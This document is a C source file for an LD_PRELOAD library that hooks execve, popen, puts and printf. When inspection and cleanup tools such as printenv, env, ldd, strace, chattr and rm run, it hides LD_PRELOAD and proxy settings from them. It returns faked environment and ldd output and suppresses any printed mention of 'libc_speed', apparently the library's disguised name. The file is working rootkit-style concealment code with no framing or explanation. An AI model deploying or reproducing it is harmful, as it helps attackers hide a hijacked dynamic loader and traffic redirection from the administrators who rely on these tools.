#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

static int (*real_execve)(const char *filename, char *const argv[], char *const envp[]) = NULL;
static FILE* (*real_popen)(const char *command, const char *type) = NULL;
static int (*real_puts)(const char *s) = NULL;
static int (*real_printf)(const char *format, ...) = NULL;

__attribute__((constructor)) static void init(void) {
    real_execve = dlsym(RTLD_NEXT, "execve");
    real_popen = dlsym(RTLD_NEXT, "popen");
    real_puts = dlsym(RTLD_NEXT, "puts");
    real_printf = dlsym(RTLD_NEXT, "printf");
}

static int should_filter_env(const char *var) {
    const char *system_vars[] = {
        "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "http_proxy", "https_proxy",
        "NO_PROXY", "no_proxy", "PYTHONPATH", "PYTHONSTARTUP", NULL
    };
    for (int i = 0; system_vars[i]; i++) {
        if (strstr(var, system_vars[i])) {
            return 1;
        }
    }
    return 0;
}

static int is_managed_command(const char *cmd) {
    const char *managed_cmds[] = {
        "unset", "export", "printenv", "env", "ldd", "strace", "ltrace",
        "chattr", "lsattr", "rm", "rmdir", "unlink", NULL
    };
    for (int i = 0; managed_cmds[i]; i++) {
        if (strstr(cmd, managed_cmds[i])) {
            return 1;
        }
    }
    return 0;
}

static void filter_environment(char *const envp[], char **new_env) {
    int i, j = 0;
    for (i = 0; envp[i]; i++) {
        if (!should_filter_env(envp[i])) {
            new_env[j++] = envp[i];
        }
    }
    new_env[j] = NULL;
}

int execve(const char *filename, char *const argv[], char *const envp[]) {
    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
    
    if (is_managed_command(filename) || (argv[0] && is_managed_command(argv[0]))) {
        char *new_env[4096];
        filter_environment(envp, new_env);
        return real_execve(filename, argv, (char *const *)new_env);
    }
    
    return real_execve(filename, argv, envp);
}

FILE *popen(const char *command, const char *type) {
    if (!real_popen) real_popen = dlsym(RTLD_NEXT, "popen");
    
    if (strstr(command, "printenv") || strstr(command, " env ")) {
        FILE *tmp = tmpfile();
        if (tmp) {
            fprintf(tmp, "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n");
            fprintf(tmp, "HOME=/root\n");
            fprintf(tmp, "USER=root\n");
            fprintf(tmp, "SHELL=/bin/bash\n");
            fflush(tmp);
            rewind(tmp);
            return tmp;
        }
    }
    
    if (strstr(command, "ldd")) {
        FILE *tmp = tmpfile();
        if (tmp) {
            fprintf(tmp, "\tlinux-vdso.so.1 (0x00007ffdabcde000)\n");
            fprintf(tmp, "\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1234567000)\n");
            fprintf(tmp, "\t/lib64/ld-linux-x86-64.so.2 (0x00007f12349ab000)\n");
            fflush(tmp);
            rewind(tmp);
            return tmp;
        }
    }
    
    return real_popen(command, type);
}

int puts(const char *s) {
    if (!real_puts) real_puts = dlsym(RTLD_NEXT, "puts");
    
    if (s && (strstr(s, "LD_PRELOAD") || strstr(s, "http_proxy") || strstr(s, "libc_speed"))) {
        return real_puts("");
    }
    
    return real_puts(s);
}

int printf(const char *format, ...) {
    if (!real_printf) real_printf = dlsym(RTLD_NEXT, "printf");
    
    if (format && (strstr(format, "LD_PRELOAD") || strstr(format, "http_proxy"))) {
        return 0;
    }
    
    va_list args;
    va_start(args, format);
    int ret = vfprintf(stdout, format, args);
    va_end(args);
    return ret;
}
